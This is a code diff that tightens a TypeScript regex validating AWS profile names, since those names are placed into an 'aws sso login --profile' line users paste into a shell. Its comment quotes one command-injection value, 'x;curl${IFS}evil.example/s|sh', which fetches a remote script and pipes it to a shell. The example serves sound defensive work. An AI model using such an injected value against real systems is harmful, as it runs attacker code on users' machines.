@@ -153,22 +153,38 @@ export const PROFILE_TEMPLATE_SENTINEL = `${TEMPLATE_SENTINEL_PREFIX}AWS_PROFILE
 /**
  * What a resolved profile name must look like before it is interpolated.
  *
- * Bounded on purpose: the value arrives from `auth.json` or the process
- * environment and lands in a string Pi will regex-match and render. One line,
- * no whitespace, at most 64 characters — AWS profile names are short
- * identifiers, and anything else is a configuration mistake, not a name.
+ * BOUNDED TO AWS'S OWN PROFILE-NAME CHARSET, NOT MERELY TO "NO WHITESPACE".
+ * The value arrives from `auth.json` or the process environment and lands in a
+ * line the user is being TRAINED TO PASTE INTO A SHELL —
+ * `aws sso login --profile <this>`. `/^[^\s]{1,64}$/` accepted `;`, `|`, `&`,
+ * backticks, `$(` and `>`: `x;curl${IFS}evil.example/s|sh` is 30 characters with
+ * no whitespace and passed. The source is `auth.json` or the ambient
+ * environment, so this is not remote input — but the harness posture is "assume
+ * a laptop with live AWS SSO credentials", the bound is free to tighten, and a
+ * composed shell line is not something this repository should ever hand over.
+ * [threat T-03-08-01, T-03-08-04]
  *
- * Counted quantifier, no `.`, no `g` flag, for the same reasons as the pattern
- * table in `sso.ts`. [threat T-03-08-01, T-03-08-04]
+ * `[-_.@A-Za-z0-9]` is AWS's own identifier charset for profile names, so
+ * nothing legitimate is excluded. Counted quantifier, no `.`, no `g` flag, for
+ * the same reasons as the pattern table in `sso.ts`.
  *
- * KNOWN LIMIT, STATED RATHER THAN HIDDEN: this bounds the *shape* of the name,
- * not its content. A profile literally named `timeout` would be interpolated
- * and would re-admit the rewritten message to Pi's retryable pattern. Nothing
- * here can distinguish that from a legitimate name, and inventing a deny-list
- * of Pi's retryable tokens would be a second copy of a table this repo does not
- * own. Recorded as a residual of [threat T-03-08-02].
+ * IT ALSO NARROWS THE RESIDUAL BELOW, WITHOUT CLOSING IT. This bounds the
+ * *shape* of the name, not its content: a profile literally named `timeout`,
+ * `terminated` or `svc-500` still passes and would re-admit the rewritten
+ * message to Pi's retryable pattern — `RETRYABLE_PROVIDER_ERROR_PATTERN`
+ * carries `terminated`, `429`, `500`, `502`, `503`, `504`, `retry delay`,
+ * `server.?error` and `internal.?error` as well as `timeout` [VERIFIED: pi-ai
+ * 0.84.1 src/utils/retry.ts:26-89], which is wider than the docstring here used
+ * to claim. What the charset removes is the punctuation those tokens would need
+ * to arrive as anything but a bare word. Inventing a deny-list of Pi's retryable
+ * tokens would be a second copy of a table this repo does not own. Recorded as a
+ * residual of [threat T-03-08-02].
+ *
+ * NOT A SUBSTITUTE FOR {@link PROFILE_TEMPLATE_SENTINEL}: the shipped
+ * placeholder is drawn entirely from this charset and passes cleanly. Shape and
+ * identity are different questions.
  */
-export const SAFE_PROFILE_NAME = /^[^\s]{1,64}$/;
+export const SAFE_PROFILE_NAME = /^[A-Za-z0-9_.@-]{1,64}$/;
 
 /**
  * `type` on the diagnostic that carries the original SDK text.
